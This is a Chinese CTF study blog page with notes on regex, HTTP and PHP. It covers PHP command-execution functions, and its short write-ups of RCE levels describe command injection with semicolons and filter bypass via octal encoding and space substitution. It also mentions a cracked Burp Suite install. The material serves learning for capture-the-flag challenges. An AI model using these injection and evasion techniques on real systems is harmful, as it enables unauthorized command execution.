<h2 id="正则表达式的基本语法与应用"><a href="#正则表达式的基本语法与应用" class="headerlink" title="正则表达式的基本语法与应用"></a><strong>正则表达式的基本语法与应用</strong></h2><p>**(1)指定⼦表达式的出现次数 **</p>
<p>除了上⾯举例中的?,*和+外,还有⼀些⽅式可以指定⼦表达式的出现次数. </p>
<p>ab{2}c 表⽰指定ac之中出现b的次数为2次 </p>
<p>ab{2,6}c 表⽰指定ac之中出现b的次数为2-6次 </p>
<p>ac{2,}c 即为表⽰指定ac之中出现b的次数⼤于等于2次 </p>
<p>**(2)正则表达式的逻辑运算符 **</p>
<p>|表⽰或 配合()⼀起使⽤ 例如a(b|c),匹配ab或ac </p>
<p>**(3)字符类运算符 **</p>
<p>[]+ ⽅括号的内容表⽰匹配的字符只能取⾃他们,注意是每⼀个字符,不是字符串 </p>
<p>_(这⾥可以思考⼀下preg_match函数中()和[]的区别,|⽤在哪个地⽅会使()和[]等价) _</p>
<p>不同字符中间也不需要分隔 </p>
<p>[abc]+ 能匹配到abc aabbcc等 </p>
<p>[a-z]+ 能匹配到所有带有⼩写字⺟的字符串 </p>
<p>[a-zA-z0-9]+ 能匹配到所有带有⼩写字⺟,⼤写字⺟或数字的字符串 </p>
<p>如果在⽅括号最开始加^,即代表否定,[^abc],则代表匹配⽆三个字⺟abc的字符串注:带⽅括号的整体为⼀整个⼦表达式 </p>
<p>如可按照\a[abc]{1}\匹配到aa ab ac. </p>
<p>可按照\1[0-4][0-9]\匹配到⼩于15 </p>
<p>0的数字 </p>
<p>**(4)元字符 **</p>
<p>正则表达式的⼤部分元字符都以\开头 </p>
<p>\d数字字符 相当于[0-9] </p>
<p>\w单词字符 代表所有的字⺟ 数字 下划线 相当于[a-zA-z0-9] </p>
<p>\s空⽩符 代表tab和空⽩符 </p>
<p>\D ⾮数字字符 </p>
<p>\W ⾮单词字符 </p>
<p>\S ⾮空⽩字符 </p>
<p>. 代表除换⾏符以外的任意字符(如果要匹配.这个符号,可以⽤.) </p>
<p>^(⼦表达式) 只匹配字符⾸ ^a只匹配⾏头的a </p>
<p>$(⼦表达式) 只匹配字符尾 $a只匹配⾏尾的a </p>
<p>这⾥要和[^abc]区分,那个只是字符类运算符! </p>
<p>**(5)正则表达式中的其他概念 **</p>
<p>贪婪与懒惰匹配 </p>
<p>*,+和{},会默认匹配尽可能多的字符,称贪婪匹配 </p>
<p>在其后加? 则切换为懒惰匹配 </p>
<p>例如&lt;.+&gt; +能够匹配⼦表达式.,即任意的⾮换⾏字符,因⽽整个正则表达式可以匹配除了换⾏符以外的整 </p>
<p>个⽂本 </p>
<p>&lt;.+?&gt; +还是能够匹配⼦表达式.但是由于?的存在,+只会选择.代表的⽂本中第⼀个字符匹配</p>
<p>例如⽂本为 abc def efg agh</p>
<p>&lt;.+&gt; 能匹配整个⽂本</p>
<p>&lt;.+?&gt; 只能以懒惰匹配识别包含于.的 a,匹配带有 a 的字符串.</p>
<p>参考视频</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1da4y1p7iZ/">https://www.bilibili.com/video/BV1da4y1p7iZ/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/10/27/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/10/27/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">第一章-预备知识</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-10-27 12:00:00" itemprop="dateCreated datePublished" datetime="2025-10-27T12:00:00+08:00">2025-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:21:09" itemprop="dateModified" datetime="2026-01-21T01:21:09+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="1-概念与简介"><a href="#1-概念与简介" class="headerlink" title="1.概念与简介"></a>1.概念与简介</h3><p>HTTP协议是Hyper TextTransfer Protocol(超文本传输协议)的缩写，主要用于网页的传输，现在也常应用网络<br>API的开发（Restful API）。</p>
<p>浏览器通过HTTP协议和服务器交流。<br>浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</p>
<p>HTTP默认端口号为80，但是你也可以改为8080或者其他端口。</p>
<p>HTTP是无连接的：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应<br>答后，即断开连接。采用这种方式可以节省传输时间。</p>
<p>HTTP是媒体独立的：这意味着，只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以<br>通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。</p>
<p>HTTP是无状态的：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果<br>后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不<br>需要先前信息时它的应答就较快。</p>
<h3 id="2-开发者工具的使用"><a href="#2-开发者工具的使用" class="headerlink" title="2.开发者工具的使用"></a>2.开发者工具的使用</h3><p>NetWork板块 记录了浏览器与服务器的所有通信</p>
<h3 id="3-http的消息结构-请求与响应"><a href="#3-http的消息结构-请求与响应" class="headerlink" title="3.http的消息结构 请求与响应"></a>3.http的消息结构 请求与响应</h3><p>请求<br>地址和关键词: 例如 GET <a target="_blank" rel="noopener" href="https://www.baidu.com/">https://www.baidu.com</a><br>请求头（header)：用来描述请求和发送者的一些信息<br>请求参数：以百度为例，要搜索的关键词</p>
<p>响应<br>响应代码：200表示成功，404表示不存在等<br>响应头 (header)：描述响应内容的一些信息<br>响应内容：HTML,JSON,图片等</p>
<p>请求 响应均可以在F12-NetWork找到.</p>
<p>一个很好用看请求的网站httpbin.org&#x2F;get<br>通过这个网站可以更简单的查看请求的详细信息。<br>可以通过Python代码模拟各种请求参数和header，发送给这个网站，再来验证发送的是否正确</p>
<h3 id="4-完整的网页请求过程"><a href="#4-完整的网页请求过程" class="headerlink" title="4.完整的网页请求过程"></a>4.完整的网页请求过程</h3><p>一个网页，通常是分多次请求的，一般的过程为：<br>先请求网页文本，也就是HTML<br>根据HTML中的指定的地址，请求其他内容，最常见的是：样式表，JavaScript，图片等<br>所以在chrome中可以看到很多个请求.</p>
<p>注意:我们用代码发送请求，一行代码只能发送一次请求，也就是获得了最基本的HTML。<br>有的网站在第一次的HTML中没有包含真实的数据，真实的数据是通过后续请求获得的，所以有时候你用代码<br>去请求发现获得的网页没有内容。</p>
<p>解决这个问题办法通常有两个：<br>分析各个请求，找到关键的后续请求，用代码发送后续关键请求获取数据。通常，我们没必要像浏览器一样发<br>送所有后续靖求，找到关键请求就够了。<br>使用selenium等浏览器驱动，模拟真实的浏览器操作，发送后续所有请求。</p>
<h3 id="5-请求的具体过程"><a href="#5-请求的具体过程" class="headerlink" title="5.请求的具体过程"></a>5.请求的具体过程</h3><h3 id="5-1请求行"><a href="#5-1请求行" class="headerlink" title="5.1请求行"></a>5.1请求行</h3><p>下面例子的第一行就是请求行(后面几行支持请求行)，它包含几个关键信息：<br>请求方法：例子中是GET，表示你要干什么<br>请求的资源地址：例子中是&#x2F;hello.txt，结合下面的Host(ww.example.com)就可以拼接处完整的地址<br>使用的HTTP协议的版本号<br>HTTP协议有多个版本，现在主要用1.1，HTTP2也有一些应用<br>例:<br>GET &#x2F;hello.txt HTTP&#x2F;1.1<br>User-Agent:cur1&#x2F;7.16.3 1ibcur1&#x2F;7.16.3 0penSsL&#x2F;0.9.71 zlib&#x2F;1.2.3<br>Host:<a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a><br>Accept-Language: en, mi</p>
<h3 id="5-2请求方法"><a href="#5-2请求方法" class="headerlink" title="5.2请求方法"></a>5.2请求方法</h3><p>根据HTTP标准，HTTP请求可以使用多种请求方法，这些方法表示这个请求要做什么。</p>
<p>最常用的请求方法是：<br>GET请求表示不要获取内容，它不会修改服务器上的数据<br>POST请求表示要提交内容，通常会修改服务器上的内容</p>
<p>GET请求的参数<br>GET请求的参数都是放在URL中的，只有GET请求才在网址上可见.<br>请求参数是以键值对的形式出现，一般形式为：<br>网址的后面紧跟着是一个问号<br>问号的后面是一对对参数，形式为：参数1&#x3D;参数1的值<br>多个参数之间用&amp;符号隔开<br>举例：<a target="_blank" rel="noopener" href="https://www.example.com/page1?%E5%8F%82%E6%95%B01=%E5%8F%82%E6%95%B01%E7%9A%84%E5%80%BC&%E5%8F%82%E6%95%B02=%E5%8F%82%E6%95%B02%E7%9A%84%E5%80%BC">https://www.example.com/page1?参数1=参数1的值&amp;参数2=参数2的值</a></p>
<p>POST请求的参数<br>POST请求的参数放在请求体中<br>网页上看不见<br>但可以通过chrome开发者工具或者抓包工具看见<br>格式举例:<br>GET &#x2F;hello.txt HTTP&#x2F;1.1<br>User-Agent:cur1&#x2F;7.16.3 1ibcur1&#x2F;7.16.3 0penssL&#x2F;0.9.71 zlib&#x2F;1.2.3<br>Host: <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a><br>Accept-Language: en, mi<br>[name’：麦叔’，‘特征’：‘帅’，‘争标’：一个美丽的城市’}</p>
<h3 id="5-3请求头"><a href="#5-3请求头" class="headerlink" title="5.3请求头"></a>5.3请求头</h3><p>服务器通常通过请求头来：判定请求是否合法，这是基本的反爬措施。<br>爬虫通常需要添加多个请求头来模拟真实的网页请求判断用户是否登陆了，<br>一般通过Cookie这个特殊的请求头的内容来判定，只要我们给出合理的Cookie，<br>服务器就认为我们是登录过了</p>
<p>请求头最重要的几个是：<br>User-Agent 代表发起访问是什么浏览器。如果不写，基本会被判定为爬虫，直接被拒了<br>Cookie 里面记录了登录信息，或者上次请求服务端设置的信息，也是常用的反爬判定点<br>Referer 表示这次请求是从哪里点过来的，有的网站不允许你直接访问某个网页，必须是从它的其他网页点过<br>来才行、这时候就要设置一个Referer值，模拟是从别的网页点过来的情况</p>
<h3 id="6-响应的具体过程"><a href="#6-响应的具体过程" class="headerlink" title="6.响应的具体过程"></a>6.响应的具体过程</h3><h3 id="6-1状态码"><a href="#6-1状态码" class="headerlink" title="6.1状态码"></a>6.1状态码</h3><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所<br>在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。<br>HTTP状态码的英文为HTTP Status Code。</p>
<p>下面是常见的HTTP状态码：<br>200-请求成功<br>301-资源(网页等）被永久转移到其它URL<br>404-请求的资源（网页等）不存在<br>500-内部服务器错误</p>
<p>HTTP状态码由三个数字组成，第一个数字定义了状态码的类型，后两个数字表示具体的状态。HTTP状态码共分为<br>5种类型：<br>分类<br>分类描述<br>1**<br>信息，服务器收到请求，需要请求者继续执行操作<br>2**<br>成功，操作被成功接收并处理<br>3**<br>重定向，需要进一步的操作以完成请求<br>4**<br>客户端错误，请求包含语法错误或无法完成请求<br>5**<br>服务器错误，服务器在处理请求的过程中发生了错误</p>
<h3 id="6-2响应头"><a href="#6-2响应头" class="headerlink" title="6.2响应头"></a>6.2响应头</h3><p>同请求头 需要则查表.</p>
<h3 id="7-黑神话CTF-WP"><a href="#7-黑神话CTF-WP" class="headerlink" title="7.黑神话CTF WP"></a>7.黑神话CTF WP</h3><p>点击”开始挑战”后,依次按图片修改网页的参数即可.<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a6c408daa.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a6c2e9554.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a6c1e7b1f.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a6c095a5e.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a6c1781a2.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a6c607e3d.png" alt="这是图片" title="Magic Gardens"></p>
<h2 id="PHP基础语法"><a href="#PHP基础语法" class="headerlink" title="PHP基础语法"></a>PHP基础语法</h2><h3 id="环境的配置-由于有C-基础-从序号一开始只叙述PHP与C-相比需要注意之处"><a href="#环境的配置-由于有C-基础-从序号一开始只叙述PHP与C-相比需要注意之处" class="headerlink" title="环境的配置 (由于有C++基础,从序号一开始只叙述PHP与C++相比需要注意之处:)"></a>环境的配置 (由于有C++基础,从序号一开始只叙述PHP与C++相比需要注意之处:)</h3><p><img src="https://youke1.picui.cn/s1/2025/10/31/6903a843efe7d.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a8446512f.png" alt="这是图片" title="Magic Gardens"></p>
<h3 id="1-PHP基础格式"><a href="#1-PHP基础格式" class="headerlink" title="1.PHP基础格式"></a>1.PHP基础格式</h3><?php
    //执行的相关PHP代码
?>

<h3 id="2-变量定义"><a href="#2-变量定义" class="headerlink" title="2.变量定义"></a>2.变量定义</h3><p> $&lt;变量名&gt;&#x3D; (无需输入数据类型)</p>
<p>PHP的主要执行对象更多是字符串 不是字符</p>
<h3 id="3-运算符"><a href="#3-运算符" class="headerlink" title="3.运算符"></a>3.运算符</h3><p>x xor y 代表异或 	<br>如果 x 和 y 有且仅有一个为 true，则返回 true</p>
<p>类型比较<br>松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。<br>严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。</p>
<h3 id="4-输出"><a href="#4-输出" class="headerlink" title="4.输出"></a>4.输出</h3><p>echo 可以输出一个或多个字符串<br>print 只允许输出一个字符串，返回值总为 1<br>print_r()：专门用于打印变量的详细信息，尤其适合数组和对象，会以可读性强的格式展示其内部结构,且执行时返回true</p>
<h3 id="5-数组"><a href="#5-数组" class="headerlink" title="5.数组"></a>5.数组</h3><p>$cars&#x3D;array(“Hello”,”CTF”);<br>echo “I like “ . $cars[0] . “ “ . $cars[1] . “.”;(体现了echo输出多个字符串.)</p>
<p>除了用array,还可以使用 [] 定义数组</p>
<p>$z &#x3D; [‘H’,’e’,’l’, ‘l’, ‘o’];<br>$z[0] &#x3D; ‘H’;<br>$z[1] &#x3D; ‘r’;<br>$z[2] &#x3D; ‘l’;<br>$z[3] &#x3D; ‘l’;<br>$z[4] &#x3D; ‘o’;</p>
<h3 id="6-魔术常量"><a href="#6-魔术常量" class="headerlink" title="6.魔术常量"></a>6.魔术常量</h3><p>形如 <strong>FILE</strong> 这样的 <strong>XXX</strong> 预定义常量，被称为魔术常量。<br><strong>FILE</strong> &#x2F;&#x2F;返回文件的完整路径和文件名</p>
<p>highlight_file(<strong>FILE</strong>); &#x2F;&#x2F;代码高亮的显示当前文件内容</p>
<h3 id="7-表单数据-‘变量名’"><a href="#7-表单数据-‘变量名’" class="headerlink" title="7.表单数据 $_&lt;名称&gt;[‘变量名’]"></a>7.表单数据 $_&lt;名称&gt;[‘变量名’]</h3><p>$_GET —— 接受 GET 请求传递的参数。</p>
<p>示例：example.com&#x2F;index.php?book&#x3D;HELLOCTF，你可以使用 $_GET[‘book’] 来获取相应的值。</p>
<p>$_POST —— 接受 POST 请求传递的参数。</p>
<p>示例：对 example.com&#x2F;index.php 进行 POST 传参，参数名为 book 内容为 HelloCTF，你可以使用 $_POST[‘book’] 来获取相应的值。</p>
<p>$_REQUEST —— 接受 GET 和 POST 以及 Cookie 请求传递的参数。</p>
<p>示例：</p>
<pre><code>如果你通过 URL 传递了一个参数 example.com/index.php?key=value_from_get，你可以通过 $_REQUEST[&#39;key&#39;] 获取这个值。
如果你通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为 value_from_post，你也可以通过 $_REQUEST[&#39;key&#39;] 获取这个值。
同时，如果你设置了一个名为 key 的 cookie，其值为 value_from_cookie，你还是可以使用 $_REQUEST[&#39;key&#39;] 来获取这个值。
</code></pre>
<h3 id="8-内建函数"><a href="#8-内建函数" class="headerlink" title="8.内建函数"></a>8.内建函数</h3><p>文件操作函数：</p>
<pre><code>include(): 导入并执行(着重,是并执行!)指定的 PHP 文件。例如：include(&#39;config.php&#39;); 会导入并执行 config.php 文件中的代码。

require(): 类似于 include()，但如果文件不存在，则会产生致命错误。

include_once(), require_once(): 与 include 和 require 类似，但只导入文件一次。

fopen(): 打开一个文件或 URL(而不执行)。例如：$file = fopen(&quot;test.txt&quot;, &quot;r&quot;); 会以只读模式打开 test.txt。

file_get_contents(): 读取文件的全部内容到一个字符串。例如：$content = file_get_contents(&quot;test.txt&quot;);

file_put_contents(): 将一个字符串写入文件。例如：file_put_contents(&quot;test.txt&quot;, &quot;Hello World!&quot;);
</code></pre>
<p>代码执行函数：</p>
<pre><code>eval(): 执行字符串中的 PHP 代码。例如：eval(&#39;$x = 5;&#39;); 会设置变量 $x 的值为 5。

assert(): 用于调试，检查一个条件是否为 true。

system(), shell_exec(), exec(), passthru(): 执行外部程序或系统命令。例如：system(&quot;ls&quot;); 会执行 ls 命令并显示输出。
</code></pre>
<p>反序列化函数：</p>
<pre><code>unserialize(): 将一个已序列化的字符串转换回 PHP 的值。例如：$array = unserialize($serializedStr); 可以将一个序列化的数组字符串转换为数组。
</code></pre>
<p>数据库操作函数：</p>
<pre><code>mysql_query(), mysqli_query(): 发送一个 MySQL 查询。例如：$result = mysql_query(&quot;SELECT * FROM users&quot;);
</code></pre>
<p>其他函数：</p>
<pre><code>preg_replace(): 执行正则表达式搜索和替换。例如：$newStr = preg_replace(&quot;/apple/i&quot;, &quot;orange&quot;, $str); 会将 $str 中的 &quot;apple&quot; 替换为 &quot;orange&quot;。

create_function(): 创建匿名的 lambda 函数。例如：$func = create_function(&#39;$x&#39;, &#39;return $x + 1;&#39;);

preg_match(&#39;/PHP/&#39;, $str)字符串匹配

cat 路径 阅读文件
</code></pre>
<h2 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h2><h3 id="一-命令执行函数介绍-怎么运行-运行条件-参数-重点-能否回显-重点"><a href="#一-命令执行函数介绍-怎么运行-运行条件-参数-重点-能否回显-重点" class="headerlink" title="一 命令执行函数介绍(怎么运行,运行条件,参数(重点),能否回显(重点))"></a>一 命令执行函数介绍(怎么运行,运行条件,参数(重点),能否回显(重点))</h3><p>(相似函数:1,3;2,4,5;6,7)<br>1.system函数(执行命令并体现返回值)<br>system(string $command,int &amp;$return_var &#x3D;?(该参数可选))<br>command:执行command参数所指定的命令，并且输出执行结果(的所有行).<br>如果提供return_var参数，则外部命令执行后的返回状态(1&#x2F;0等)将会被设置到此变量中。</p>
<p>2.exec函数(执行指令并体现执行的输出和返回值(不直接打印))<br>exec(string $command,array &amp;$output &#x3D;?(可选),int &amp;$return var&#x3D;?(可选))<br>command参数:要执行的命令。注意:单独使用时只有最后一行结果返回并且打印，其他的行不会回显<br>output 参数:用命令执行的输出填充此数组,每行输出填充数组中的一个元素。即逐行填充数组。<br>return_var参数:同上 表示返回值.<br>后两个参数可以借用print_r输出结果.<br>exec(ls);<br>print_r(output);<br>即可显示ls的输出结果</p>
<p>3.passthru函数(执行命令并输出二进制数据.在安全渗透测试中与system无差别.)<br>passthru(string $command, int &amp;$return_var &#x3D;?)<br>command参数：执行的命令，并且输出执行结果(的所有行)。<br>输出二进制数据，并且需要直接传送到浏览器。</p>
<p>4.shell_exec函数(执行命令,返回命令的输出(为值但不直接打印))<br>shell_exec(string cmd)<br>cmd参数：要执行的命令。<br>环境执行命令，并且将完整的输出以字符串的方式返回。<br>借用echo、print等输出结果<br>echo shell_exec(cmd)</p>
<p>5.&#96;&#96;函数<br>与shell_exec功能相同,这里不赘述.</p>
<p>6.popen函数(执行命令,返回值特殊)<br>popen(string $command, string $mode)<br>command参数：要执行的命令。<br>mode参数：模式。r表示阅读，w表示写入。<br>popen函数返回值是一个写入的文档,遵循fgets获取内容→print_r输出内容<br>a &#x3D; popen(“ls”,’r’);<br>$s&#x3D;fgets($a);<br>print_r($s);<br>才可以把内容输出</p>
<p>7.proc_open函数(执行命令,返回值特殊)<br>proc_open($command,$descriptor_spec,$pipes,<br>$cwd,$env_vars,$options)<br>一般只修改command参数<br>不直接回显</p>
<p>8.pcntl_ехес(使用前需安装模块)<br>pcntl_exec(string $path, array $args &#x3D;?,array<br>$envs &#x3D;?)<br>path必须时可执行二进制文件路径或一个在文<br>件第一行指定了一个可执行文件路径标头的<br>脚本(比如文件第一行是#!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;perl<br>的perl脚本）。<br>args是一个要传递给程序的参数的字符串数组。<br>envs是一个要传递给程序作为环境变量的字符<br>串数组。这个数组是key&#x3D;&gt;value格式的，key<br>代表要传递的环境变量的名称，value代表该<br>环境变量值。<br>在当前进程空间执行指定程序。</p>
<h3 id="二-RCE-Level0-8-WP"><a href="#二-RCE-Level0-8-WP" class="headerlink" title="二 RCE Level0-8 WP"></a>二 RCE Level0-8 WP</h3><p>0 进入界面即得flag<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a91b84dde.png" alt="这是图片" title="Magic Gardens"><br>1 post修改如图变量<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a91b67395.png" alt="这是图片" title="Magic Gardens"><br>2 先用get改action为’r’,获得随机的函数,再改成submit并用该函数的正确语法填充content,提交即得<br>flag<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a91b50f10.png" alt="这是图片" title="Magic Gardens"><br>3 post修改如图变量<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a91b4258c.png" alt="这是图片" title="Magic Gardens"><br>4 输ip加分号使得两个命令先后运行,获得flag<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a91b6c54f.png" alt="这是图片" title="Magic Gardens"><br>5 get修改如图变量<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a9246543c.png" alt="这是图片" title="Magic Gardens"><br>6 用八进制避开字符检测键入命令,先找到flag的路径,再获得flag<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a92570e4f.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a92609a92.png" alt="这是图片" title="Magic Gardens"><br>7 空格符如图代替 其余同第六题 抓住检测的字符是什么以尝试替换<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a92660e75.png" alt="这是图片" title="Magic Gardens"><br>8 get修改a变量 后加分号屏蔽代码中的屏蔽<br><img src="https://youke1.picui.cn/s1/2025/10/31/6903a926bdec7.png" alt="这是图片" title="Magic Gardens"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/10/26/%E5%BA%8F%E7%AB%A0-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/10/26/%E5%BA%8F%E7%AB%A0-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">序章-工具的安装与使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-10-26 22:00:00" itemprop="dateCreated datePublished" datetime="2025-10-26T22:00:00+08:00">2025-10-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:21:39" itemprop="dateModified" datetime="2026-01-21T01:21:39+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="1-浏览器开发者工具F12-浏览器自带无需安装"><a href="#1-浏览器开发者工具F12-浏览器自带无需安装" class="headerlink" title="1.浏览器开发者工具F12(浏览器自带无需安装)"></a>1.浏览器开发者工具F12(浏览器自带无需安装)</h3><p><img src="https://youke1.picui.cn/s1/2025/10/26/68fe369827833.png" alt="这是图片" title="Magic Gardens"></p>
<h3 id="2-Hackbar安装"><a href="#2-Hackbar安装" class="headerlink" title="2.Hackbar安装"></a>2.Hackbar安装</h3><p>在火狐中找到附加组件管理器,搜索本组件并进入安装.<br><img src="https://youke1.picui.cn/s1/2025/10/26/68fe37cae91e4.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/26/68fe387e408ca.png" alt="这是图片" title="Magic Gardens"></p>
<h3 id="3-Burp-Suite安装"><a href="#3-Burp-Suite安装" class="headerlink" title="3.Burp Suite安装"></a>3.Burp Suite安装</h3><p>这是安装和破解的完成图<br><img src="https://youke1.picui.cn/s1/2025/10/26/68fe456315937.png" alt="这是图片" title="Magic Gardens"></p>
<h3 id="4-AI使用"><a href="#4-AI使用" class="headerlink" title="4.AI使用"></a>4.AI使用</h3><p>详见下文 AI写脚本</p>
<h3 id="5-攻防世界"><a href="#5-攻防世界" class="headerlink" title="5.攻防世界"></a>5.攻防世界</h3><p>第一题 F12获取即可<br><img src="https://youke1.picui.cn/s1/2025/10/26/68fe3c58db256.png" alt="这是图片" title="Magic Gardens"><br>第二题<br>先在url中添加相应的参数<br><img src="https://youke1.picui.cn/s1/2025/10/27/68fe472a7a61a.png" alt="这是图片" title="Magic Gardens"><br>再使用开发者工具-HackBar输入地址与参数,点execute即可<br><img src="https://youke1.picui.cn/s1/2025/10/27/68fe481c2215a.png" alt="这是图片" title="Magic Gardens"></p>
<h3 id="6-AI写脚本"><a href="#6-AI写脚本" class="headerlink" title="6.AI写脚本"></a>6.AI写脚本</h3><p><img src="https://youke1.picui.cn/s1/2025/10/26/68fe3e6171208.png" alt="这是图片" title="Magic Gardens"><br><img src="https://youke1.picui.cn/s1/2025/10/26/68fe3f1c876d8.png" alt="这是图片" title="Magic Gardens"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
